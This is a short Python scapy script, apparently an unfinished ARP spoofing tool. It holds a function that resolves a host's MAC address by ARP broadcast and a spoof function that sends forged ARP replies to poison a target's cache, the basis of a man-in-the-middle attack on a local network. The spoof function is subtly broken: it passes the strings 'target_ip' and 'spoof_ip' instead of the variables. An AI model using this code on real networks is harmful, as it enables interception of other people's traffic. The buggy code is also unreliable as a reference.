#!/usr/bin/env python

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print("----------------------------------------------------")
    print(answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst="target_ip", hwdst="08:00:27:0a:03:ef", psrc="spoof_ip")
    scapy.send(packet)


#testing the program
get_mac("10.0.2.1")